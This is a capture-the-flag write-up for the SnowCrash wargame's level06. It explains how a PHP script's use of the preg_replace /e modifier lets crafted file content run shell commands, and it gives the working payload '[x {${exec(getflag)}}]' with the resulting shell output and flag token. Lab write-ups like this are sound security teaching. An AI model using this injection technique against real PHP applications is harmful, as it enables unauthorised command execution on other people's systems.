we can see the level06.php

```
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

you can see that they use the /e regex modifier that eval any paramaters given, so easily exploitable, we just have to meet the needs to the $2 replacement
```
(\[x (.*)\])
```
the first capture group is `\[x (.*)\]` so `[x blibloublou]` will match.

the second capture group is (.*) and that what's given to the y function

we can now build an exploit

```

[x {${exec(getflag)}}]

```

the `{${exec(...)}}` will execute any given command as the shell own by the user who own the script here flag06

as PHP is the most beautiful language here the error given

```

level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/toto; ./level06 /tmp/toto aa
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

```

we notice that the getflag function just generated an error but was executed properly, we now own the flag.

more about the /e modifier: http://php.net/manual/en/reference.pcre.pattern.modifiers.php